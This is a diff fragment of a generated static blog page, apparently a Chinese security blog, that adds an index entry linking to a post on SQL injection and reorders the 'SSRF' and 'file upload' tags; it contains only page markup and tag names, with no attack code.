+          <a class="article-more-a" style="display: none;" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
@@ -807,11 +1010,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
             
             <div class="clearfix"></div>
